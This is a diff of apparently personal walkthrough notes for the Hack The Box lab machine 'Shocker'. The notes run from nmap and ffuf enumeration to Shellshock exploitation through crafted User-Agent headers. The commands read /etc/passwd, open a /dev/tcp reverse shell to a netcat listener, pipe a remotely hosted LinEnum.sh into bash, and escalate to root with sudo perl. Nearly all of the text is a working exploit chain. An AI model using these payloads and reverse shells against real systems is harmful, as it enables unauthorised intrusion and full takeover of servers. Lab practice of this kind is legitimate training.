@@ -1,21 +1,32 @@
+########################################################################
+Prep
+########################################################################
 
 sudo vim /usr/share/nmap/scripts/http-shellshock.nse
 comment out line 100
+
+Firefox:
+about:config
+network.captive-portal-service.enabled
 
 cd ~
 mkdir shocker
 cd shocker
 
-sudo nmap -Pn --sS -oA shocker-init 10.10.10.56
+########################################################################
+Start
+########################################################################
+
+sudo nmap -Pn -sV -sS -oA shocker-init 10.10.10.56
 cat shocker-init
 
-sudo nmap -Pn -sV -sS -A -p- --script vuln -O -oA shocker-full 10.10.10.56
+sudo nmap -Pn -sV -sS -A -p- -T5 -vv --script vuln -O -oA shocker-full 10.10.10.56
 cat shocker-full
 
 
 ffuf -w /usr/share/dirb/wordlists/big.txt -u http://10.10.10.56/FUZZ
 
-ffuf -w /usr/share/dirb/wordlists/big.txt -e .sh,.py -u http://10.10.10.56/cgi-bin/FUZZ
+ffuf -w /usr/share/dirb/wordlists/big.txt -e .sh -u http://10.10.10.56/cgi-bin/FUZZ
 
 
 
@@ -23,17 +34,36 @@ sudo nmap -Pn -sS -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/u
 cat shocker-script
 
 
+http://10.10.10.56/cgi-bin/user.sh
 
-/bin/bash -i >& /dev/tcp/10.10.14.16/4444 0>&1
+
+nc -lvnp 1234
+
+
+User-Agent: () { :;}; echo; /bin/bash -c 'cat /etc/passwd'
+
+
+sudo tcpdump -i tun0 icmp
+User-Agent: () { :;}; echo; /bin/bash -c 'ping 10.10.14.24 -c 4'
+
+
+User-Agent: () { :; }; echo; /bin/bash -i >& /dev/tcp/10.10.14.24/1234 0>&1
+
+
 
 
 python3 -c "import pty;pty.spawn('/bin/bash')"
 
+cd ~/htb/enum
+./start-pythonwebserver.sh
+#sudo python3 -m http.server 8888
 
-sudo python3 -m http.server 8888
+curl http://10.10.14.24:8888/LinEnum.sh | bash
 
-wget http://10.10.14.24:8888/LinEnum.sh -O LinEnum.sh
-
-Sudo -l
+sudo -l
 
 sudo perl -e 'system ("/bin/bash")'
+
+id
+
+cat /root/root.txt
